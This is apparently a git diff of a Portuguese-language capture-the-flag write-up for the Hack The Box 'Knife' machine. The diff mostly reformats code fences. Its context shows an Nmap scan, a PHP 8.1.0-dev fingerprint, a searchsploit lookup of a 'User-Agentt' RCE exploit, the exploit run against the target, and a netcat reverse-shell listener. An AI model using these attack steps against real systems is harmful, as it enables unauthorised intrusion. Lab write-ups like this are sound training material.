@@ -25,7 +25,7 @@ alt: "HTB Knife Writeup"
 ## RECON
 
 ### Nmap
-```
+```bash
 ┌──(hastur㉿hastur)-[~]
 └─$ sudo nmap -v -sCV -p- -Pn -O 10.10.10.242 --min-rate=512 
 PORT   STATE SERVICE VERSION
@@ -53,7 +53,7 @@ A varredura com gobuster também não trouxe nada relevante.
 
 Vamos tentar o whatweb para obter mais informações.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~]
 └─$ whatweb http://10.10.10.242/
 http://10.10.10.242/ [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.242], PHP[8.1.0-dev], Script, Title[Emergent Medical Idea], X-Powered-By[PHP/8.1.0-dev]
@@ -61,7 +61,7 @@ http://10.10.10.242/ [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTP
 
 Conseguimos identificar que o server roda em PHP na versão "PHP/8.1.0-dev", vamos procurar algum exploit.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~]
 └─$ searchsploit "PHP 8.1.0-dev" 
 PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution                       | php/webapps/49933.py
@@ -70,7 +70,7 @@ Esta versão do PHP possui uma vulnerabilidade que permite execução de código
 
 Vamos copiar o exploit para nosso diretório e nomeá-lo como "exploit.py" para testá-lo.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/knife]
 └─$ python3 exploit.py
 Enter the full host url:
@@ -110,7 +110,6 @@ drwxrwxrwt  16 root root 12288 Sep  4 00:00 tmp
 drwxr-xr-x  15 root root  4096 May 18 13:20 usr
 drwxr-xr-x  14 root root  4096 May  9 04:22 var
 
-$ 
 
 ```
 
@@ -118,7 +117,7 @@ Ao executarmos o exploit, temos uma versão bem resumida de RCE em forma de bash
 
 Para podermos explorar de forma efetiva, precisamos de um tty shell, vamos iniciar um netcat ouvindo a conexão reversa.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/knife]
 └─$ nc -vlnp 8443
 listening on [any] 8443 ...
@@ -126,7 +125,7 @@ listening on [any] 8443 ...
 
 Agora vamos enviar um payload no terminal do RCE.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/knife]
 └─$ python3 exploit.py
 Enter the full host url:
@@ -165,7 +164,7 @@ Ao tentar executar o programa, ele nos retora uma grande lista de opções de ar
 
 Isso significa que podemos executar scripts em ruby, vamos voltar para o diretorio do usuário james e criar um script.
 
-```
+```bash
 james@knife:~$ pwd                                   
 pwd
 /home/james
